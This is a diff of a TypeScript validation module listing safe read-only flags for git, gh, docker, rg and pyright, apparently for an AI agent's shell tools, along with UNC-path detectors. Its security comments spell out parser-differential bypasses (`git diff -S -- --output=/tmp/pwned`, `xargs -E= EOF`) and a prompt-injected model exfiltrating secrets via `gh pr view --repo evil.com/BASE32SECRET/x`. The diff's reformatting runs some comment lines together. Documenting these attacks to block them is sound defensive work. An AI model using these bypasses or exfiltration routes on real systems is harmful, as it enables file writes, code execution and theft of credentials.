@@ -1,3 +1,4 @@
+// DSXU V15 ownership marker: upstream-derived capability is absorbed into DSXU mainline; no upstream vendor runtime dependency.
 /**
  * Shared command validation maps for shell tools (BashTool, PowerShellTool, etc.).
  *
@@ -8,13 +9,10 @@
  * - containsVulnerableUncPath: UNC path detection for credential leak prevention
  * - outputLimits are in outputLimits.ts
  */
-
 import { getPlatform } from '../platform.js'
-
 // ---------------------------------------------------------------------------
 // Types
 // ---------------------------------------------------------------------------
-
 export type FlagArgType =
   | 'none' // No argument (--color, -n)
   | 'number' // Integer argument (--context=3)
@@ -22,7 +20,6 @@ export type FlagArgType =
   | 'char' // Single character (delimiter)
   | '{}' // Literal "{}" only
   | 'EOF' // Literal "EOF" only
-
 export type ExternalCommandConfig = {
   safeFlags: Record<string, FlagArgType>
   // Returns true if the command is dangerous, false if safe.
@@ -36,25 +33,21 @@ export type ExternalCommandConfig = {
   // Default: true (most tools respect `--`).
   respectsDoubleDash?: boolean
 }
-
 // ---------------------------------------------------------------------------
 // Shared git flag groups
 // ---------------------------------------------------------------------------
-
 const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
   '--all': 'none',
   '--branches': 'none',
   '--tags': 'none',
   '--remotes': 'none',
 }
-
 const GIT_DATE_FILTER_FLAGS: Record<string, FlagArgType> = {
   '--since': 'string',
   '--after': 'string',
   '--until': 'string',
   '--before': 'string',
 }
-
 const GIT_LOG_DISPLAY_FLAGS: Record<string, FlagArgType> = {
   '--oneline': 'none',
   '--graph': 'none',
@@ -63,12 +56,10 @@ const GIT_LOG_DISPLAY_FLAGS: Record<string, FlagArgType> = {
   '--date': 'string',
   '--relative-date': 'none',
 }
-
 const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
   '--max-count': 'number',
   '-n': 'number',
 }
-
 // Stat output flags - used in git log, show, diff
 const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
   '--stat': 'none',
@@ -77,13 +68,11 @@ const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
   '--name-only': 'none',
   '--name-status': 'none',
 }
-
 // Color output flags - used in git log, show, diff
 const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
   '--color': 'none',
   '--no-color': 'none',
 }
-
 // Patch display flags - used in git log, show
 const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
   '--patch': 'none',
@@ -92,18 +81,15 @@ const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
   '--no-ext-diff': 'none',
   '-s': 'none',
 }
-
 // Author/committer filter flags - used in git log, reflog
 const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
   '--author': 'string',
   '--committer': 'string',
   '--grep': 'string',
 }
-
 // ---------------------------------------------------------------------------
-// GIT_READ_ONLY_COMMANDS — complete map of all git subcommands
+// GIT_READ_ONLY_COMMANDS ...complete map of all git subcommands
 // ---------------------------------------------------------------------------
-
 export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   'git diff': {
     safeFlags: {
@@ -159,12 +145,10 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-l': 'none',
       // SECURITY: -S/-G/-O take REQUIRED string arguments (pickaxe search,
       // pickaxe regex, orderfile). Previously 'none' caused a parser
-      // differential with git: `git diff -S -- --output=/tmp/pwned` —
-      // validator sees -S as no-arg → advances 1 token → breaks on `--` →
-      // --output unchecked. git sees -S requires arg → consumes `--` as the
+      // differential with git: `git diff -S -- --output=/tmp/pwned` ...      // validator sees -S as no-arg  -> advances 1 token  -> breaks on `--` -> // --output unchecked. git sees -S requires arg  -> consumes `--` as the
       // pickaxe string (standard getopt: required-arg options consume next
-      // argv unconditionally, BEFORE the top-level `--` check) → cursor at
-      // --output=... → parses as long option → ARBITRARY FILE WRITE.
+      // argv unconditionally, BEFORE the top-level `--` check)  -> cursor at
+      // --output=...> parses as long option  -> ARBITRARY FILE WRITE.
       // git log config at line ~207 correctly has -S/-G as 'string'.
       '-S': 'string',
       '-G': 'string',
@@ -275,11 +259,11 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       ...GIT_COUNT_FLAGS,
       ...GIT_AUTHOR_FILTER_FLAGS,
     },
-    // SECURITY: Block `git reflog expire` (positional subcommand) — it writes
+    // SECURITY: Block `git reflog expire` (positional subcommand) ...it writes
     // to .git/logs/** by expiring reflog entries. `git reflog delete` similarly
     // writes. Only `git reflog` (bare = show) and `git reflog show` are safe.
     // The positional-arg fallthrough at ~:1730 would otherwise accept `expire`
-    // as a non-flag arg, and `--all` is in GIT_REF_SELECTION_FLAGS → passes.
+    // as a non-flag arg, and `--all` is in GIT_REF_SELECTION_FLAGS  -> passes.
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
@@ -294,9 +278,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
         // First non-flag positional: check if it's a dangerous subcommand.
         // If it's `show` or a ref name like `HEAD`/`refs/...`, safe.
         if (DANGEROUS_SUBCOMMANDS.has(token)) {
-          return true // Dangerous subcommand — writes to .git/logs/**
+          return true // Dangerous subcommand ...writes to .git/logs/**
         }
-        // First positional is safe (show/HEAD/ref) — subsequent are ref args
+        // First positional is safe (show/HEAD/ref) ...subsequent are ref args
         return false
       }
       return false // No positional = bare `git reflog` = safe (shows reflog)
@@ -510,7 +494,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--all': 'none', // Output all merge bases
     },
   },
-  // git rev-parse is a pure read command — resolves refs to SHAs, queries repo paths
+  // git rev-parse is a pure read command ...resolves refs to SHAs, queries repo paths
   'git rev-parse': {
     safeFlags: {
       // SHA resolution and verification
@@ -536,7 +520,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--path-prefix': 'none',
     },
   },
-  // git rev-list is read-only commit enumeration — lists/counts commits reachable from refs
+  // git rev-list is read-only commit enumeration ...lists/counts commits reachable from refs
   'git rev-list': {
     safeFlags: {
       ...GIT_REF_SELECTION_FLAGS,
@@ -572,7 +556,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--graph': 'none',
     },
   },
-  // git describe is read-only — describes commits relative to the most recent tag
+  // git describe is read-only ...describes commits relative to the most recent tag
   'git describe': {
     safeFlags: {
       // Tag selection
@@ -592,8 +576,8 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--broken': 'none', // Append "-broken" if repository is in invalid state
     },
   },
-  // git cat-file is read-only object inspection — displays type, size, or content of objects
-  // NOTE: --batch (without --check) is intentionally excluded — it reads arbitrary objects
+  // git cat-file is read-only object inspection ...displays type, size, or content of objects
+  // NOTE: --batch (without --check) is intentionally excluded ...it reads arbitrary objects
   // from stdin which could be exploited in piped commands to dump sensitive objects.
   'git cat-file': {
     safeFlags: {
@@ -602,13 +586,13 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-s': 'none', // Print size of object
       '-p': 'none', // Pretty-print object contents
       '-e': 'none', // Exit with zero if object exists, non-zero otherwise
-      // Batch mode — read-only check variant only
+      // Batch mode ...read-only check variant only
       '--batch-check': 'none', // For each object on stdin, print type and size (no content)
       // Output control
       '--allow-undetermined-type': 'none',
     },
   },
-  // git for-each-ref is read-only ref iteration — lists refs with optional formatting and filtering
+  // git for-each-ref is read-only ref iteration ...lists refs with optional formatting and filtering
   'git for-each-ref': {
     safeFlags: {
       // Output formatting
@@ -625,7 +609,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--points-at': 'string', // Only list refs pointing at specified object
     },
   },
-  // git grep is read-only — searches tracked files for patterns
+  // git grep is read-only ...searches tracked files for patterns
   'git grep': {
     safeFlags: {
       // Pattern matching modes
@@ -687,7 +671,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--quiet': 'none',
     },
   },
-  // git stash show is read-only — displays diff of a stash entry
+  // git stash show is read-only ...displays diff of a stash entry
   'git stash show': {
     safeFlags: {
       ...GIT_STAT_FLAGS,
@@ -700,7 +684,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--abbrev': 'number',
     },
   },
-  // git worktree list is read-only — lists linked working trees
+  // git worktree list is read-only ...lists linked working trees
   'git worktree list': {
     safeFlags: {
       '--porcelain': 'none',
@@ -728,7 +712,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--ignore-case': 'none',
     },
     // SECURITY: Block tag creation via positional arguments. `git tag foo`
-    // creates .git/refs/tags/foo (41-byte file write) — NOT read-only.
+    // creates .git/refs/tags/foo (41-byte file write) ...NOT read-only.
     // This is identical semantics to `git branch foo` (which has the same
     // callback below). Without this callback, validateFlags's default
     // positional-arg fallthrough at ~:1730 accepts `mytag` as a non-flag arg,
@@ -742,7 +726,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     ) => {
       // Safe uses: `git tag` (list), `git tag -l pattern` (list filtered),
       // `git tag --contains <ref>` (list containing). A bare positional arg
-      // without -l/--list is a tag name to CREATE — dangerous.
+      // without -l/--list is a tag name to CREATE ...dangerous.
       const flagsWithArgs = new Set([
         '--contains',
         '--no-contains',
@@ -771,7 +755,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
         }
         if (!seenDashDash && token.startsWith('-')) {
           // Check for -l/--list (exact or in a bundle). `-li` bundles -l and
-          // -i — both 'none' type. Array.includes('-l') exact-matches, missing
+          // -i ...both 'none' type. Array.includes('-l') exact-matches, missing
           // bundles like `-li`, `-il`. Check individual chars for short bundles.
           if (token === '--list' || token === '-l') {
             seenListFlag = true
@@ -823,11 +807,11 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--no-column': 'none',
       // SECURITY: --abbrev stays 'number' so validateFlags accepts --abbrev=N
       // (attached form, safe). The DETACHED form `--abbrev N` is the bug:
-      // git uses PARSE_OPT_OPTARG (optional-attached only) — detached N becomes
+      // git uses PARSE_OPT_OPTARG (optional-attached only) ...detached N becomes
       // a POSITIONAL branch name, creating .git/refs/heads/N. validateFlags
       // with 'number' consumes N, but the CALLBACK below catches it: --abbrev
       // is NOT in callback's flagsWithArgs (removed), so callback sees N as a
-      // positional without list flag → dangerous. Two-layer defense: validate-
+      // positional without list flag  -> dangerous. Two-layer defense: validate-
       // Flags accepts both forms, callback blocks detached.
       '--abbrev': 'number',
       '--no-abbrev': 'none',
@@ -921,22 +905,20 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
   },
 }
-
 // ---------------------------------------------------------------------------
-// GH_READ_ONLY_COMMANDS — ant-only gh CLI commands (network-dependent)
+// GH_READ_ONLY_COMMANDS ...ant-only gh CLI commands (network-dependent)
 // ---------------------------------------------------------------------------
-
 // SECURITY: Shared callback for all gh commands to prevent network exfil.
-// gh's repo argument accepts `[HOST/]OWNER/REPO` — when HOST is present
+// gh's repo argument accepts `[HOST/]OWNER/REPO` ...when HOST is present
 // (3 segments), gh connects to that host's API. A prompt-injected model can
 // encode secrets as the OWNER segment and exfiltrate via DNS/HTTP:
 //   gh pr view 1 --repo evil.com/BASE32SECRET/x
-//   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
+//    -> GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
 // gh also accepts positional URLs: `gh pr view https://evil.com/owner/repo/pull/1`
 //
 // git ls-remote has an inline URL guard (readOnlyValidation.ts:~944); this
 // callback provides the equivalent for gh. Rejects:
-//   - Any token with 2+ slashes (HOST/OWNER/REPO format — normal is OWNER/REPO)
+//   - Any token with 2+ slashes (HOST/OWNER/REPO format ...normal is OWNER/REPO)
 //   - Any token with `://` (URL)
 //   - Any token with `@` (SSH-style)
 // This covers BOTH --repo values AND positional URL/repo arguments, INCLUDING
@@ -980,9 +962,8 @@ function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
   }
   return false
 }
-
 export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
-  // gh pr view is read-only — displays pull request details
+  // gh pr view is read-only ...displays pull request details
   'gh pr view': {
     safeFlags: {
       '--json': 'string', // JSON field selection
@@ -992,7 +973,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr list is read-only — lists pull requests
+  // gh pr list is read-only ...lists pull requests
   'gh pr list': {
     safeFlags: {
       '--state': 'string', // open, closed, merged, all
@@ -1013,7 +994,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr diff is read-only — shows pull request diff
+  // gh pr diff is read-only ...shows pull request diff
   'gh pr diff': {
     safeFlags: {
       '--color': 'string',
@@ -1024,7 +1005,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr checks is read-only — shows CI status checks
+  // gh pr checks is read-only ...shows CI status checks
   'gh pr checks': {
     safeFlags: {
       '--watch': 'none',
@@ -1037,7 +1018,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue view is read-only — displays issue details
+  // gh issue view is read-only ...displays issue details
   'gh issue view': {
     safeFlags: {
       '--json': 'string',
@@ -1047,7 +1028,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue list is read-only — lists issues
+  // gh issue list is read-only ...lists issues
   'gh issue list': {
     safeFlags: {
       '--state': 'string',
@@ -1066,7 +1047,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh repo view is read-only — displays repository details
+  // gh repo view is read-only ...displays repository details
   // NOTE: gh repo view uses a positional argument, not --repo/-R flags
   'gh repo view': {
     safeFlags: {
@@ -1074,7 +1055,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh run list is read-only — lists workflow runs
+  // gh run list is read-only ...lists workflow runs
   'gh run list': {
     safeFlags: {
       '--branch': 'string', // Filter by branch
@@ -1098,7 +1079,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh run view is read-only — displays a workflow run's details
+  // gh run view is read-only ...displays a workflow run's details
   'gh run view': {
     safeFlags: {
       '--log': 'none', // Show full run log
@@ -1116,7 +1097,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh auth status is read-only — displays authentication state
+  // gh auth status is read-only ...displays authentication state
   // NOTE: --show-token/-t intentionally excluded (leaks secrets)
   'gh auth status': {
     safeFlags: {
@@ -1128,7 +1109,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr status is read-only — shows your PRs
+  // gh pr status is read-only ...shows your PRs
   'gh pr status': {
     safeFlags: {
       '--conflict-status': 'none', // Display merge conflict status
@@ -1139,7 +1120,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue status is read-only — shows your issues
+  // gh issue status is read-only ...shows your issues
   'gh issue status': {
     safeFlags: {
       '--json': 'string', // JSON field selection
@@ -1148,7 +1129,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh release list is read-only — lists releases
+  // gh release list is read-only ...lists releases
   'gh release list': {
     safeFlags: {
       '--exclude-drafts': 'none', // Exclude draft releases
@@ -1163,7 +1144,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh release view is read-only — displays release details
+  // gh release view is read-only ...displays release details
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh release view': {
     safeFlags: {
@@ -1173,7 +1154,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh workflow list is read-only — lists workflow files
+  // gh workflow list is read-only ...lists workflow files
   'gh workflow list': {
     safeFlags: {
       '--all': 'none', // Include disabled workflows
@@ -1186,7 +1167,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh workflow view is read-only — displays workflow summary
+  // gh workflow view is read-only ...displays workflow summary
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh workflow view': {
     safeFlags: {
@@ -1199,7 +1180,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh label list is read-only — lists labels
+  // gh label list is read-only ...lists labels
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh label list': {
     safeFlags: {
@@ -1215,7 +1196,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh search repos is read-only — searches repositories
+  // gh search repos is read-only ...searches repositories
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh search repos': {
     safeFlags: {
@@ -1243,7 +1224,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--visibility': 'string', // Filter: public|private|internal
     },
   },
-  // gh search issues is read-only — searches issues
+  // gh search issues is read-only ...searches issues
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh search issues': {
     safeFlags: {
@@ -1283,7 +1264,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--visibility': 'string', // Filter: public|private|internal
     },
   },
-  // gh search prs is read-only — searches pull requests
+  // gh search prs is read-only ...searches pull requests
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh search prs': {
     safeFlags: {
@@ -1333,7 +1314,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--visibility': 'string', // Filter: public|private|internal
     },
   },
-  // gh search commits is read-only — searches commits
+  // gh search commits is read-only ...searches commits
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh search commits': {
     safeFlags: {
@@ -1360,7 +1341,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--visibility': 'string', // Filter: public|private|internal
     },
   },
-  // gh search code is read-only — searches code
+  // gh search code is read-only ...searches code
   // NOTE: --web/-w intentionally excluded (opens browser)
   'gh search code': {
     safeFlags: {
@@ -1378,11 +1359,9 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
   },
 }
-
 // ---------------------------------------------------------------------------
-// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs read-only commands
+// DOCKER_READ_ONLY_COMMANDS ...docker inspect/logs read-only commands
 // ---------------------------------------------------------------------------
-
 export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
     'docker logs': {
@@ -1408,11 +1387,9 @@ export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
       },
     },
   }
-
 // ---------------------------------------------------------------------------
-// RIPGREP_READ_ONLY_COMMANDS — rg (ripgrep) read-only search
+// RIPGREP_READ_ONLY_COMMANDS ...rg (ripgrep) read-only search
 // ---------------------------------------------------------------------------
-
 export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
     rg: {
@@ -1421,7 +1398,6 @@ export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
         '-e': 'string', // Pattern to search for
         '--regexp': 'string',
         '-f': 'string', // Read patterns from file
-
         // Common search options
         '-i': 'none', // Case insensitive
         '--ignore-case': 'none',
@@ -1433,7 +1409,6 @@ export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
         '--word-regexp': 'none',
         '-v': 'none', // Invert match
         '--invert-match': 'none',
-
         // Output options
         '-c': 'none', // Count matches
         '--count': 'none',
@@ -1457,7 +1432,6 @@ export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
         '-q': 'none', // Quiet
         '--quiet': 'none',
         '--column': 'none',
-
         // File filtering
         '-g': 'string', // Glob
         '--glob': 'string',
@@ -1469,7 +1443,6 @@ export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
         '--hidden': 'none',
         '--no-ignore': 'none',
         '-u': 'none', // Unrestricted
-
         // Common options
         '-m': 'number', // Max count per file
         '--max-count': 'number',
@@ -1480,27 +1453,22 @@ export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
         '-z': 'none', // Search zip
         '-L': 'none', // Follow symlinks
         '--follow': 'none',
-
         // Display options
         '--color': 'string',
         '--json': 'none',
         '--stats': 'none',
-
         // Help and version
         '--help': 'none',
         '--version': 'none',
         '--debug': 'none',
-
         // Special argument separator
         '--': 'none',
       },
     },
   }
-
 // ---------------------------------------------------------------------------
-// PYRIGHT_READ_ONLY_COMMANDS — pyright static type checker
+// PYRIGHT_READ_ONLY_COMMANDS ...pyright static type checker
 // ---------------------------------------------------------------------------
-
 export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
     pyright: {
@@ -1529,23 +1497,19 @@ export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
       },
     },
   }
-
 // ---------------------------------------------------------------------------
-// EXTERNAL_READONLY_COMMANDS — cross-shell read-only commands
+// EXTERNAL_READONLY_COMMANDS ...cross-shell read-only commands
 // Only commands that work identically in bash and PowerShell on Windows.
 // Unix-specific commands (cat, head, wc, etc.) belong in BashTool's READONLY_COMMANDS.
 // ---------------------------------------------------------------------------
-
 export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
   // Cross-platform external tools that work the same in bash and PowerShell on Windows
   'docker ps',
   'docker images',
 ] as const
-
 // ---------------------------------------------------------------------------
 // UNC path detection (shared across Bash and PowerShell)
 // ---------------------------------------------------------------------------
-
 /**
  * Check if a path or command contains a UNC path that could trigger network
  * requests (NTLM/Kerberos credential leakage, WebDAV attacks).
@@ -1564,7 +1528,6 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
   if (getPlatform() !== 'windows') {
     return false
   }
-
   // 1. Check for general UNC paths with backslashes
   // Pattern matches: \\server, \\server\share, \\server/share, \\server@port\share
   // Uses [^\s\\/]+ for hostname to catch Unicode homoglyphs and other non-ASCII chars
@@ -1573,7 +1536,6 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
   if (backslashUncPattern.test(pathOrCommand)) {
     return true
   }
-
   // 2. Check for forward-slash UNC paths
   // Pattern matches: //server, //server/share, //server\share, //192.168.1.1/share
   // Uses negative lookbehind (?<!:) to exclude URLs (https://, http://, ftp://)
@@ -1585,17 +1547,15 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
   if (forwardSlashUncPattern.test(pathOrCommand)) {
     return true
   }
-
   // 3. Check for mixed-separator UNC paths (forward slash + backslashes)
   // On Windows/Cygwin, /\ is equivalent to // since both are path separators.
   // In bash, /\\server becomes /\server after escape processing, which is a UNC path.
   // Requires 2+ backslashes after / because a single backslash just escapes the next char
-  // (e.g., /\a → /a after bash processing, which is NOT a UNC path).
+  // (e.g., /\a  -> /a after bash processing, which is NOT a UNC path).
   const mixedSlashUncPattern = /\/\\{2,}[^\s\\/]/
   if (mixedSlashUncPattern.test(pathOrCommand)) {
     return true
   }
-
   // 4. Check for mixed-separator UNC paths (backslashes + forward slash)
   // \\/server in bash becomes \/server after escape processing, which is a UNC path
   // on Windows since both \ and / are path separators.
@@ -1603,19 +1563,16 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
   if (reverseMixedSlashUncPattern.test(pathOrCommand)) {
     return true
   }
-
   // 5. Check for WebDAV SSL/port patterns
   // Examples: \\server@SSL@8443\path, \\server@8443@SSL\path
   if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
     return true
   }
-
   // 6. Check for DavWWWRoot marker (Windows WebDAV redirector)
   // Example: \\server\DavWWWRoot\path
   if (/DavWWWRoot/i.test(pathOrCommand)) {
     return true
   }
-
   // 7. Check for UNC paths with IPv4 addresses (explicit check for defense-in-depth)
   // Examples: \\192.168.1.1\share, \\10.0.0.1\path
   if (
@@ -1624,7 +1581,6 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
   ) {
     return true
   }
-
   // 8. Check for UNC paths with bracketed IPv6 addresses (explicit check for defense-in-depth)
   // Examples: \\[2001:db8::1]\share, \\[::1]\path
   if (
@@ -1633,17 +1589,13 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
   ) {
     return true
   }
-
   return false
 }
-
 // ---------------------------------------------------------------------------
 // Flag validation utilities
 // ---------------------------------------------------------------------------
-
 // Regex pattern to match valid flag names (letters, digits, underscores, hyphens)
 export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/
-
 /**
  * Validates flag arguments based on their expected type
  */
@@ -1668,7 +1620,6 @@ export function validateFlagArgument(
       return false
   }
 }
-
 /**
  * Validates the flags/arguments portion of a tokenized command against a config.
  * This is the flag-walking loop extracted from BashTool's isCommandSafeViaFlagParsing.
@@ -1692,14 +1643,12 @@ export function validateFlags(
   },
 ): boolean {
   let i = startIndex
-
   while (i < tokens.length) {
     let token = tokens[i]
     if (!token) {
       i++
       continue
     }
-
     // Special handling for xargs: once we find the target command, stop validating flags
     if (
       options?.xargsTargetCommands &&
@@ -1715,10 +1664,9 @@ export function validateFlags(
       }
       return false
     }
-
     if (token === '--') {
       // SECURITY: Only break if the tool respects POSIX `--` (default: true).
-      // Tools like pyright don't respect `--` — they treat it as a file path
+      // Tools like pyright don't respect `--` ...they treat it as a file path
       // and continue processing subsequent tokens as flags. Breaking here
       // would let `pyright -- --createstub os` auto-approve a file-write flag.
       if (config.respectsDoubleDash !== false) {
@@ -1729,36 +1677,31 @@ export function validateFlags(
       i++
       continue
     }
-
     if (token.startsWith('-') && token.length > 1 && FLAG_PATTERN.test(token)) {
       // Handle --flag=value format
       // SECURITY: Track whether the token CONTAINS `=` separately from
       // whether the value is non-empty. `-E=` has `hasEquals=true` but
       // `inlineValue=''` (falsy). Without `hasEquals`, the falsy check at
-      // line ~1813 would fall through to "consume next token" — but GNU
+      // line ~1813 would fall through to "consume next token" ...but GNU
       // getopt for short options with mandatory arg sees `-E=` as `-E` with
       // ATTACHED arg `=` (it doesn't strip `=` for short options). Parser
       // differential: validator advances 2 tokens, GNU advances 1.
       //
       // Attack: `xargs -E= EOF echo foo` (zero permissions)
-      //   Validator: inlineValue='' falsy → consumes EOF as -E arg → i+=2 →
-      //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → break → AUTO-ALLOWED
-      //   GNU xargs: -E attached arg=`=` → EOF is TARGET COMMAND → CODE EXEC
+      //   Validator: inlineValue='' falsy  -> consumes EOF as -E arg  -> i+=2 -> //     echo  -> SAFE_TARGET_COMMANDS_FOR_XARGS  -> break  -> AUTO-ALLOWED
+      //   GNU xargs: -E attached arg=`=`  -> EOF is TARGET COMMAND  -> CODE EXEC
       //
       // Fix: when hasEquals is true, use inlineValue (even if empty) as the
-      // provided arg. validateFlagArgument('', 'EOF') → false → rejected.
+      // provided arg. validateFlagArgument('', 'EOF')  -> false  -> rejected.
       // This is correct for all arg types: the user explicitly typed `=`,
       // indicating they provided a value (empty). Don't consume next token.
       const hasEquals = token.includes('=')
       const [flag, ...valueParts] = token.split('=')
       const inlineValue = valueParts.join('=')
-
       if (!flag) {
         return false
       }
-
       const flagArgType = config.safeFlags[flag]
-
       if (!flagArgType) {
         // Special case: git commands support -<number> as shorthand for -n <number>
         if (options?.commandName === 'git' && flag.match(/^-\d+$/)) {
@@ -1766,7 +1709,6 @@ export function validateFlags(
           i++
           continue
         }
-
         // Handle flags with directly attached numeric arguments (e.g., -A20, -B10)
         // Only apply this special handling to grep and rg commands
         if (
@@ -1777,7 +1719,6 @@ export function validateFlags(
         ) {
           const potentialFlag = flag.substring(0, 2) // e.g., '-A' from '-A20'
           const potentialValue = flag.substring(2) // e.g., '20' from '-A20'
-
           if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
             // This is a flag with attached numeric argument
             const flagArgType = config.safeFlags[potentialFlag]
@@ -1792,7 +1733,6 @@ export function validateFlags(
             }
           }
         }
-
         // Handle combined single-letter flags like -nr
         // SECURITY: We must NOT allow any bundled flag that takes an argument.
         // GNU getopt bundling semantics: when an arg-taking option appears LAST
@@ -1802,12 +1742,12 @@ export function validateFlags(
         // Our naive handler previously only checked EXISTENCE in safeFlags (both
